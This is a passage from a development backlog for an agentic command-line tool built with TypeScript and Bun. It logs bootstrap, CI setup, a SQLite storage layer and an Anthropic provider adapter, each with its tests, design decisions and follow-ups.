- Total suite now **86 tests / 166 expect() calls** in ~180ms.

**Code-review fixes folded in before commit:**
- `mapStopReason` no longer accepts null/undefined. The `message_delta` handler only updates `stopReason` when the SDK actually sends a string. A later `delta: { stop_reason: null }` can no longer clobber an earlier valid `'tool_use'` and turn the canonical `stop` event into the wrong reason.
- `KNOWN_STOP_REASONS` is typed as `ReadonlySet<string>`; the ugly `as Set<string>` cast is gone.
- Combined the duplicate `import` from `./anthropic/capabilities.ts` in the registry.
- Adapter wiring now has real coverage: a mock `Anthropic` client (passed via the `client` test seam) verifies that `generate()` pipes the SDK stream through the normalizer, that optional fields are omitted when absent, and that `countTokens()` calls `messages.countTokens` and returns the SDK's `input_tokens`.

**Decisions:**
- **No real API calls in unit tests.** The stream normalizer takes any `AsyncIterable<RawAnthropicEvent>`; tests construct mock event sequences with async generators. Real-network coverage will live in evals (M5+).
- **`RawAnthropicEvent` is a local minimal type**, structurally compatible with the SDK's `Anthropic.Messages.RawMessageStreamEvent`. Decouples the normalizer from SDK upgrades that touch peripheral fields.
- **`generateConstrained` is a stub.** Anthropic implements constrained output via forced `tool_choice`, but the M1 autonomous loop never calls it — the DAG executor (M6) does. Failing loud beats silent emulation.
- **`metadata` field on `GenerateRequest` is not forwarded** to the SDK (yet). Anthropic's `MetadataParam` is `{ user_id?: string | null }`, narrower than our generic `Record<string, string>`. Telemetry will route user identity through a dedicated channel when needed.
- **`ProviderToolDef.input_schema` is typed as `{ type: 'object'; ... }`**, not arbitrary `Record<string, unknown>`. Matches both Anthropic and OpenAI tool-calling requirements; refusing malformed schemas at compile time beats runtime errors from the provider.
- **Registry as factory, not singleton** — each test gets a fresh registry. Shared global state was the mistake to avoid.
- **`sampling: SamplingSupport`** field from `PROVIDERS.md §1` intentionally omitted in M1; arrives with `TOKEN_TUNING` work.
- **Capabilities are declared honestly** per `PROVIDERS.md` principle 2 — the adapter exposes streaming because it streams; tools because it does native tool-calling; cache because Anthropic's prompt cache is server-side. Nothing claimed that the code doesn't do.

**Out of scope:**
- Vision input (M2+ when CLI accepts image paste)
- Extended thinking *actions* (we pass `thinking_delta` through but don't yet leverage it for the agent loop)
- Cache breakpoints (responsibility of the Context Engine, not the adapter)
- Retry/backoff on 5xx/529 (lives in the harness's provider call wrapper, Step 5)
- Token-counter caching (every `countTokens` call hits the network; harness can memoize)
- OpenAI, Ollama, llama.cpp adapters (M5; this step lays the interface they'll implement)

**Follow-ups (registered now, addressed later):**
- `ModelEntry.factory` is monomorphic over `CreateProviderOptions` (currently aliased to `CreateAnthropicProviderOptions`). Once a second family lands, this needs to become a discriminated union (or the entry generic over its options type) so that calling an OpenAI factory with Anthropic options is a compile error, not a runtime crash. Address in M5 when the second adapter ships.
- `ProviderMessageRole` is `'user' | 'assistant'` (Anthropic represents tool results as user messages with `tool_result` blocks), but storage's `MessageRole` is `'user' | 'assistant' | 'tool'`. A storage→provider converter is needed when the harness joins both ends. Will land in Step 5.
- `ANTHROPIC_MODEL_NAMES = Object.keys(ANTHROPIC_CAPS)` loses literal types; if we want a typed union of allowed model names, we need `as const` plumbing or a generated constant. Cosmetic — fix when DX pain shows up.

**Pending:** none for this step.

**Next:** Step 4 — Permission Engine + first 6 tools (`AGENTIC_CLI §7.1, §8`). Glob/prefix policy YAML loader (no regex), `Tool<I, O>` interface, the read/write/edit/grep/glob/bash tools, harness-blocking pre-tool checks. The Anthropic adapter emits `tool_use_*` events; the tool layer will consume them.

---

## [2026-04-27] M1 / Step 2 — Storage layer (SQLite, MVP)

**Done:**
- `src/storage/db.ts` — connection factory over `bun:sqlite`. Sets `PRAGMA foreign_keys = ON` on every connection (Bun default is OFF). For file-backed DBs adds `journal_mode = WAL` and `synchronous = NORMAL`; skipped for `:memory:`. Auto-creates the parent directory.
- `src/storage/paths.ts` — XDG-aware default path resolution: `$XDG_DATA_HOME/forja/sessions.db` or `~/.local/share/forja/sessions.db`.
- `src/storage/migrate.ts` — idempotent runner. Records each applied migration in `_migrations` with `sha256(sql)`. Re-applying a migration whose SQL changed throws (catches accidental drift). Each migration runs inside a transaction.
- `src/storage/migrations/001-initial.ts` — first migration: `sessions`, `messages`, `tool_calls` per `AGENTIC_CLI §13`, with `CHECK` constraints on enum columns, FK cascades, and the indexes from §13. Inlined as TS so it survives `bun build --compile`.
- `src/storage/repos/{sessions,messages,tool-calls}.ts` — thin function-based repositories. No classes, no ORM. Camel-case domain types, snake-case row types, explicit `fromRow`. JSON columns serialized via `JSON.stringify`/`JSON.parse` (SQLite has no JSONB). State transitions enforced at the SQL layer (`UPDATE ... WHERE status = 'running'`) and reflected as thrown errors when the transition is illegal.
- `src/storage/index.ts` — single public surface; re-exports types and functions.
- `tests/storage/*.test.ts` — 6 files, **51 tests** covering: XDG fallback (incl. empty string), migration idempotency, hash-mismatch refusal, whitespace-insensitive hash, table creation, CRUD round-trips, ordering, filters, FK cascades, FK enforcement, CHECK rejection of invalid enums, illegal state transitions, cross-session parent rejection, transaction commit/rollback semantics, `openDb` directory creation, PRAGMA assertions.
- Total suite now **55 tests / 97 expect() calls** in ~150ms.

**Code-review fixes folded in before commit:**
- `finishToolCall` now refuses to overwrite a finished call (`AND status IN ('pending','running')` in the UPDATE). Without this, a buggy retry path could silently turn a `done` row into `error`.
- Migration hash now normalizes whitespace before SHA-256, so reformatting committed SQL no longer trips the drift detector. Semantic changes (renamed column, different type) still produce a different hash.
- Hash-mismatch error includes both the applied hash and the current hash.
- `appendMessage` validates that `parentId` lives in the same session (FK alone only checks existence). Prevents silently-corrupted message threads.
- `tool_calls` got a `created_at INTEGER NOT NULL` column and `idx_tool_calls_message_created`; `listToolCallsByMessage` now orders by `created_at ASC, id ASC` (UUIDs aren't time-sortable).
- `withTransaction(db, fn)` exposed in `src/storage/db.ts` so the harness can group multi-row writes (message + tool_calls) atomically without learning Bun's curried `db.transaction()` API.

**Decisions:**
- **`allowImportingTsExtensions: true`** added to tsconfig — Bun's idiomatic style is `.ts` in imports; without the flag tsc rejects them. Compatible because `noEmit: true`.
- **Disabled Biome rule `performance/noDelete`** — its auto-fix would convert `delete process.env.X` to `process.env.X = undefined`, which in Node/Bun sets the env var to the string literal `"undefined"` instead of removing it. That would silently break our XDG fallback test. The V8 hidden-class concern doesn't apply to non-hot test code.
- **Repos as functions, not classes** — keeps testing trivial (`(db, input) → result`), aligns with "no ORM" rule, matches the spec's pseudocode style.
- **JSON columns are `unknown`** at the type boundary — repos don't claim to know the shape of message content or tool input/output. Caller validates if it cares.
- **`completeSession` and `startToolCall` distinguish "not found" from "wrong state"** — diagnostic value at low cost.
- **Indexes from spec §13.1** included verbatim (`sessions(started_at DESC)`, `(cwd, started_at DESC)`, `(status, started_at DESC)`, `messages(session_id, created_at)`, `tool_calls(tool_name, status)`).

**Out of scope (deferred to the step that needs them):**
- `goal_stack` (with the harness when goal injection lands)
- `approvals` (with permissions)
- `checkpoints` (with rollback / git integration in M3)
- `hook_runs`, `background_processes`, `memory_events`, `recap_runs`, `recap_cache`, `traces`, `artifacts` (each with its own subsystem in M3+)

**Pending:** none for this step.

**Next:** Step 3 — Provider Anthropic adapter + Model Registry skeleton (`AGENTIC_CLI §14`, `PROVIDERS.md`). Minimal `Provider` interface, real `generate()` against `@anthropic-ai/sdk` with streaming, capability declaration, request shape that the harness will consume in Step 5.

---

## [2026-04-27] M1 / Step 1.5 — Production hygiene pass

**Done:**
- `.github/workflows/ci.yml` — runs typecheck → lint → test on push to `main` and on every PR. Bun pinned to `1.3.13`. Concurrency group cancels superseded runs.
- `.editorconfig` at the root — keeps cross-editor formatting aligned with Biome (2-space, LF, UTF-8, final newline). Markdown keeps trailing whitespace (line breaks).
- Trusted Biome's postinstall (`bun pm trust @biomejs/biome`) so the platform binary is fetched at install time instead of lazily on first lint. Bun added `trustedDependencies` to `package.json`.
- `tests/cli.test.ts` — first smoke test: `--version`, `-v`, `--version --json`, no-args exit-1. Also unblocks `bun test` in CI (zero test files makes Bun exit 1).

**Decisions:**
- **Skipped pre-commit hook and README.md** for now (explicit user call). CI gate covers the regression case for the moment.
- **CI uses `bun install --frozen-lockfile`** — fail loud if `bun.lock` drifts from `package.json`.
- **CI Bun version pinned to current dev (`1.3.13`)** rather than floating `latest` — reproducible builds beat free upgrades.
- **Smoke test uses `Bun.spawnSync`** (not `node:child_process`) — consistent with the runtime, no extra type dance.

**Pending:** README and pre-commit hook still owed eventually.

**Next:** Step 2 — Storage layer (SQLite) per `AGENTIC_CLI §13`.

---

## [2026-04-27] M1 / Step 1 — Repository bootstrap

**Done:**
- Branch `feat/m1-foundation` created from `main`.
- `CLAUDE.md` at the root: root premise, Doc→Subsystem map, locked stack, hard rules, workflow.
- `docs/BACKLOG.md` (this file).
- `package.json` with scripts (`dev`, `test`, `lint`, `typecheck`, `build`) and bin `agent`.
- `tsconfig.json` strict (including `noUncheckedIndexedAccess`, `exactOptionalPropertyTypes`, `verbatimModuleSyntax`).
- `biome.json` (linter + formatter, 100 col, single quotes, semicolons).
- `.gitignore` covering runtime state per spec §2.7 (`.agent/sessions.db`, traces, checkpoints, local memory).
- `src/cli/index.ts` stub — responds to `--version` / `-v`; anything else exits 1 with a pointer to the spec.
- Project-wide language policy: English everywhere except `docs/spec/` (PT-BR).

**Decisions:**
- **Test runner:** `bun test` built-in, not Vitest from spec §16. Reason: aligns with principle 5 ("single runtime"); zero extra deps. Revisit if a critical Vitest feature is missing.
- **Linter:** Biome (single binary, Bun-friendly) instead of ESLint + Prettier — same single-runtime alignment.
- **`docs/BACKLOG.md` instead of `.txt`** — markdown renders on GitHub and matches the rest of the repo.
- **Branch per milestone** (`feat/mN-*`) until trunk-based stabilizes.
- **No empty subsystem folders** — they emerge in the step that needs them. `.gitkeep` in empty dirs is noise.
- **Stack matches spec §3** exactly: TS + Bun + bun:sqlite + Ink. No drift.
- **Project language is English**; only `docs/spec/` stays in PT-BR.

**Pending:** none for this step.

**Next:** Step 2 — Storage layer (SQLite) with the minimal schema from `AGENTIC_CLI §13`: tables `sessions`, `messages`, `tool_calls`, `approvals`, `checkpoints`, `traces`. Migrations infra. Thin repository pattern over `bun:sqlite`. Schema + basic CRUD tests.
